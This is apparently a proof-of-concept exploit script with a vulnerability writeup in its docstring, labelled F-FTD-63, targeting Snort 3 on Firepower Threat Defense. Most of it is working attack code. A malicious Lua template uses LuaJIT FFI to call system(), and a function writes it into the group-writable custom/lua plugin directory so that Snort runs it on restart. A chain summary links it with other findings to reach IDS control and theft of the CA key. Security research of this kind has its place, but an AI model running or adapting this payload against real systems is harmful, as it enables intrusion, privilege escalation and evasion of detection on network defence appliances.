"""
F-FTD-63: Snort 3 Plugin Directory Writable by detection Group — LuaJIT FFI Code Execution
CONTROLLED ENVIRONMENT ONLY

Root cause:
  /var/sf/snort/ (package staging dir) and /var/sf/detection_engines/<id>/custom/lua/
  are owned root:detection (GID 95) with permissions 0775 (group-writable).

  Group 'detection' members (from /etc/rc.d/init.d/addusers):
    sfrna, sfsnort, www, casuser, lamplighter

  Snort 3 loads Lua plugins from:
    <config_dir>/odp/lua/    (ODP scripts, root-owned)
    <config_dir>/custom/lua/ (custom scripts, detection-group writable)

  ICDB integrity database (snort3.icdb) covers:
    - /__SNORTPATH__/snort         (SHA-512 + RSA-2048 signature)
    - /__SNORTPATH__/snort2lua     (SHA-512 + RSA-2048 signature)
  ICDB does NOT cover:
    - .so dynamic plugins (loaded via dlopen, only stat() check)
    - Lua scripts in odp/lua or custom/lua
    - snort3.lua configuration file

  LuaJIT FFI unrestricted: Snort 3 ships with LuaJIT (libluajit-5.1.so.2).
  Lua plugins can call ffi.cdef() to declare any C symbol, then invoke via ffi.C.
  Since libc.so.6 is loaded in the snort process, ffi.C.system() is available
  even though snort's PLT does not import system@GLIBC directly.

Attack chain:
  1. FDM compromise (e.g., F-FTD-60 pre-auth takeover + authenticated RCE)
     → shell as 'www' user (member of detection group)
  2. Write malicious Lua payload to detection-group-writable custom/lua/ directory
  3. Snort loads the Lua script on next policy push or daemon restart
  4. LuaJIT FFI executes arbitrary code as sfsnort user

Payload (minimal):
  ffi = require("ffi")
  ffi.cdef("int system(const char *cmd);")
  ffi.C.system("id > /tmp/snort-pwned")

Security mitigations present in snort binary:
  - PIE: YES (ASLR enabled)
  - NX stack: YES (GNU_STACK RW, not RWX)
  - RELRO: PARTIAL (got.plt at 0xafd000, outside RELRO segment 0xac6870-0xac7870)
  - No BIND_NOW
  These mitigations protect against memory corruption but NOT plugin injection.

Affected versions: FTD 6.7.0-65 (confirmed). Likely all 6.x with Snort 3.
"""

# CONTROLLED ENVIRONMENT ONLY

import os
import sys
import stat
import subprocess
import time

# Runtime paths derived from pm binary strings:
#   %s/var/sf/detection_engines/%s/snort3
# config_dir = /var/sf/detection_engines/<engine_id>/
SNORT_DETECTION_ENGINES = "/var/sf/detection_engines"
SNORT_PACKAGE_DIR = "/var/sf/snort"  # staging dir: drwxrwxr-x root:detection

# Malicious Lua payload using LuaJIT FFI
# system() available via libc.so.6 (always loaded in snort process)
MALICIOUS_LUA_TEMPLATE = '''
-- F-FTD-63: Snort 3 LuaJIT FFI code execution via detection-group write
-- CONTROLLED ENVIRONMENT ONLY
ffi = require("ffi")
ffi.cdef[[
int system(const char *cmd);
]]
ffi.C.system("{cmd}")
'''

MALICIOUS_LUA_FILENAME = "snort_ftd63_check.lua"


def check_prerequisites():
    """Verify detection group membership and writable paths."""
    issues = []

    # Check current user's groups
    try:
        result = subprocess.run(['id'], capture_output=True, text=True)
        print(f"[*] Current identity: {result.stdout.strip()}")
        if 'detection' not in result.stdout and '95' not in result.stdout:
            issues.append("Not in detection group (GID 95) — need www/sfsnort/casuser")
    except Exception as e:
        issues.append(f"id check failed: {e}")

    # Check snort package dir
    if os.path.exists(SNORT_PACKAGE_DIR):
        s = os.stat(SNORT_PACKAGE_DIR)
        mode = oct(s.st_mode)
        gid = s.st_gid
        writable = bool(s.st_mode & stat.S_IWGRP)
        print(f"[*] {SNORT_PACKAGE_DIR}: mode={mode} gid={gid} group-writable={writable}")
        if not writable:
            issues.append(f"{SNORT_PACKAGE_DIR} not group-writable")
    else:
        print(f"[-] {SNORT_PACKAGE_DIR} not found — not running on FTD host")

    # Check detection_engines for custom/lua dirs
    if os.path.exists(SNORT_DETECTION_ENGINES):
        for engine_id in os.listdir(SNORT_DETECTION_ENGINES):
            custom_lua = os.path.join(SNORT_DETECTION_ENGINES, engine_id, "custom", "lua")
            if os.path.exists(custom_lua):
                s = os.stat(custom_lua)
                writable = os.access(custom_lua, os.W_OK)
                print(f"[+] Found custom/lua: {custom_lua} writable={writable}")
    else:
        print(f"[-] {SNORT_DETECTION_ENGINES} not found")

    return issues


def find_custom_lua_dirs():
    """Find all writable custom/lua directories under detection_engines."""
    dirs = []
    if not os.path.exists(SNORT_DETECTION_ENGINES):
        return dirs
    for engine_id in os.listdir(SNORT_DETECTION_ENGINES):
        custom_lua = os.path.join(SNORT_DETECTION_ENGINES, engine_id, "custom", "lua")
        if os.path.exists(custom_lua) and os.access(custom_lua, os.W_OK):
            dirs.append(custom_lua)
    return dirs


def inject_lua_payload(custom_lua_dir, cmd):
    """
    Write malicious Lua payload to custom/lua directory.
    Snort will execute it on next policy push or restart.
    CONTROLLED ENVIRONMENT ONLY
    """
    payload = MALICIOUS_LUA_TEMPLATE.format(cmd=cmd)
    payload_path = os.path.join(custom_lua_dir, MALICIOUS_LUA_FILENAME)

    print(f"\n[*] Writing LuaJIT FFI payload to: {payload_path}")
    print(f"    Command: {cmd}")
    print(f"    Payload:\n{payload}")

    try:
        with open(payload_path, 'w') as f:
            f.write(payload)
        print(f"[+] Payload written — awaiting Snort restart or policy push")
        return payload_path
    except PermissionError:
        print(f"[-] Permission denied: {payload_path}")
        return None
    except Exception as e:
        print(f"[-] Write failed: {e}")
        return None


def verify_icdb_scope():
    """Show that ICDB does not cover plugins or Lua scripts."""
    icdb_path = None
    # Look for snort3.icdb in extracted package or installed path
    candidates = [
        "/var/sf/snort3/snort3.icdb",
        "/usr/local/lib/snort_dynamicsrc/snort3.icdb",
    ]
    for c in candidates:
        if os.path.exists(c):
            icdb_path = c
            break

    if icdb_path:
        print(f"\n[+] Found snort3.icdb: {icdb_path}")
        with open(icdb_path, 'r') as f:
            content = f.read()
        print(f"    Contents:\n{content}")
        if 'lua' in content.lower() or '.so' in content:
            print(f"[?] ICDB appears to cover more than binary — re-check scope")
        else:
            print(f"[!] CONFIRMED: ICDB covers only snort + snort2lua binaries")
            print(f"    Lua plugins and .so plugins are NOT integrity-verified")
    else:
        print(f"[*] ICDB not found at runtime paths — using static analysis result:")
        print(f"    snort3.icdb covers: /__SNORTPATH__/snort, /__SNORTPATH__/snort2lua")
        print(f"    Lua scripts in custom/lua: NOT COVERED")
        print(f"    .so plugins in snort_plugins: NOT COVERED")


def demonstrate_ffi_surface():
    """Generate proof-of-concept Lua file demonstrating FFI attack surface."""
    poc_path = "/tmp/ftd63_ffi_poc.lua"
    poc = '''-- F-FTD-63 FFI attack surface demonstration
-- LuaJIT ffi.C resolves from all loaded shared libraries
-- libc.so.6 is always in the snort process — system() accessible

ffi = require("ffi")

-- Declare targets from libc (not in snort PLT but available via FFI)
ffi.cdef[[
    int system(const char *cmd);
    FILE* popen(const char *cmd, const char *type);
    char* fgets(char *s, int size, void *stream);
    int pclose(void *stream);
    int getuid(void);
    int getgid(void);
]]

-- Proof of concept: read process identity
local uid = ffi.C.getuid()
local gid = ffi.C.getgid()

-- Execute command as snort user
ffi.C.system("echo 'F-FTD-63: LuaJIT FFI exec as UID='$(id) > /tmp/ftd63-proof.txt")
'''
    with open(poc_path, 'w') as f:
        f.write(poc)
    print(f"\n[+] FFI PoC Lua file written to: {poc_path}")
    print(f"    Test with: luajit {poc_path}")
    print(f"    On FTD: place in custom/lua/ → loaded by snort on next restart")
    return poc_path


if __name__ == '__main__':
    print("=" * 70)
    print("F-FTD-63: Snort 3 Plugin Injection via detection Group Write")
    print("CONTROLLED ENVIRONMENT ONLY")
    print("=" * 70)

    print("\n--- ICDB Coverage Analysis ---")
    verify_icdb_scope()

    print("\n--- Prerequisites Check ---")
    issues = check_prerequisites()

    if issues:
        print(f"\n[!] Prerequisites not met:")
        for i in issues:
            print(f"    - {i}")
        print(f"\n[*] Static analysis confirms:")
        print(f"    /var/sf/snort/: drwxrwxr-x root:detection(95) — group writable")
        print(f"    detection group members: sfsnort, www, casuser, lamplighter")
        print(f"    ICDB scope: snort + snort2lua only — Lua scripts unverified")
        print(f"    LuaJIT FFI can call system() from libc.so.6 (always loaded)")

    print("\n--- FFI Attack Surface Demonstration ---")
    demonstrate_ffi_surface()

    print("\n--- Chain Summary ---")
    print("""
Attack chain (CONTROLLED ENVIRONMENT ONLY):
  1. F-FTD-60 pre-auth FDM takeover → admin access
  2. FDM API: deploy/modify intrusion policy → shell callback via Lua plugin path
     OR: FDM web app RCE → shell as www (detection group member)
  3. Write malicious Lua to /var/sf/detection_engines/<id>/custom/lua/
     Payload: ffi.cdef("int system(const char*);") + ffi.C.system("<cmd>")
  4. Trigger policy push or snort restart → Lua executes as sfsnort
  5. sfsnort is not root, but has access to:
     - snort detection DB (sfsnort MySQL grants)
     - /etc/sf/ca_root/private/cakey.pem (F-FTD-61: if sfsnort in sfca group)
     - /var/sf/remediations/ (chained with F-FTD-59 for SFRemediateD exec)

Severity: HIGH (privilege escalation + detection evasion — attacker controls IDS)
""")
    print("[*] CONTROLLED ENVIRONMENT ONLY.")
